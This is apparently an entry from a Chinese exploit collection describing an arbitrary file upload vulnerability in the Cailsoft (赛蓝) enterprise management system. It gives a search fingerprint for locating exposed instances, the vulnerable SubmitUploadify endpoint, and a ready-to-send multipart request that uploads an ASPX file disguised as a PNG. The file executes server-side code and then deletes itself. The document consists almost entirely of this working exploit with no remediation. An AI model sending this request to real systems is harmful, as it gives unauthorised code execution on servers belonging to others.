# 赛蓝企业管理系统-SubmitUploadify-任意文件上传漏洞

Dify ｜ 文件上传 ｜ —
- **指纹**：`body="www.cailsoft.com"`
- **请求**：`POST /EHRModule/EHR_Holidays/SubmitUploadify?FolderId=1&UserId=1 HTTP/1.1`

**Payload**
```
Gecko) Chrome/127.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryD5Mawpg068t7pbxZ
------WebKitFormBoundaryD5Mawpg068t7pbxZ
Content-Disposition: form-data; name="Filedata"; filename="1.aspx"
Content-Type: image/png
<%@ Page Language="C#"%><%
Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
------WebKitFormBoundaryD5Mawpg068t7pbxZ--
```
- **响应特征**：200